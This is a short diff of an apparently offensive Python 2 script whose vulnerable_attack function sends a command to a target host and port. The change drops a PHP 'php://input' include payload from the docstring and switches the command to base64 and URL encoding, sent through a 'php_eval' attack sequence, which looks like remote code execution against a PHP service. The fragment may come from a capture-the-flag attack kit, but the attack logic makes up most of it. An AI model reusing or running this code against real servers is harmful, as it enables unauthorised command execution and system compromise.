@@ -12,13 +12,15 @@ def vulnerable_attack(target,target_port,cmd):
     '''
     this is the payload script for vuln:
 
-    include "php://input";
+    replay with some traffic
 
     '''
     
     try:	   
-	cmd = urllib.unquote(cmd)
-	res = sequence_attack(target,target_port,cmd,'test',4)	 
+        print "cmd => " + cmd
+        cmd = base64.b64encode(cmd) 
+        cmd = urllib.quote(cmd)
+	res = sequence_attack(target,target_port,cmd,'php_eval',1)	 
     except Exception,e:
 	debug_print(traceback.format_exc())	
 	dump_error(target,"attack failed","sample.py attack")
